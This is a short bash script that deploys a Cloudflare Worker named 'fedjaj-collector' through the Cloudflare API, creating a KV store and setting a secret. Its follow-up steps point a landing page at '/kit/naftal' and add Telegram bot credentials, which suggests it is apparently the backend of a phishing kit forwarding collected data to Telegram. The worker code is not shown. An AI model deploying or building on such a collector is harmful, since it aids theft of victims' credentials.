#!/bin/bash
# FEDJAJ deploy script — run once with your Cloudflare credentials
#
# Prereqs:
#   1. Cloudflare account + API token (Workers:Edit scope)
#   2. KV namespace created
#   3. TF variable set
#
# Usage:
#   CF_ACCOUNT_ID=xxx CF_API_TOKEN=yyy CF_RAW_KEY=hex CF_KV_ID=zzz ./deploy.sh

set -euo pipefail

ACCOUNT_ID="${CF_ACCOUNT_ID:?}"
API_TOKEN="${CF_API_TOKEN:?}"
RAW_KEY="${CF_RAW_KEY:?}"
KV_ID="${CF_KV_ID:-}"
WORKER_NAME="fedjaj-collector"

echo "=== FEDJAJ Deploy ==="
echo "Account: $ACCOUNT_ID"
echo "Worker:  $WORKER_NAME"

# Create KV namespace if needed
if [ -n "$KV_ID" ]; then
  echo "KV: $KV_ID"
else
  echo "Creating KV namespace..."
  KV_RESP=$(curl -s -X POST \
    -H "Authorization: Bearer $API_TOKEN" \
    -H "Content-Type: application/json" \
    "https://api.cloudflare.com/client/v4/accounts/$ACCOUNT_ID/storage/kv/namespaces" \
    -d '{"title":"FEDJAJ"}')
  KV_ID=$(echo "$KV_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['result']['id'])")
  echo "KV created: $KV_ID"
fi

# Upload worker script
echo "Uploading worker..."
curl -s -X PUT \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: application/javascript" \
  "https://api.cloudflare.com/client/v4/accounts/$ACCOUNT_ID/workers/scripts/$WORKER_NAME" \
  --data-binary @"infra/collector-worker.js" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('OK' if d['success'] else d['errors'])"

# Set secrets
echo "Setting secrets..."
echo -n "$RAW_KEY" | curl -s -X PUT \
  -H "Authorization: Bearer $API_TOKEN" \
  -H "Content-Type: text/plain" \
  "https://api.cloudflare.com/client/v4/accounts/$ACCOUNT_ID/workers/scripts/$WORKER_NAME/secrets/CF_RAW_KEY" \
  --data-binary @- > /dev/null

echo ""
echo "=== Deployed ==="
echo "Worker URL: https://$WORKER_NAME.your-subdomain.workers.dev"
echo "KV: $KV_ID"
echo ""
echo "Next steps:"
echo "  1. Update landing page URL to: https://$WORKER_NAME.your-subdomain.workers.dev/kit/naftal"
echo "  2. Set TG_BOT_TOKEN + TG_CHAT_ID via Cloudflare Workers Secrets"
echo "  3. Test: curl https://$WORKER_NAME.your-subdomain.workers.dev/health"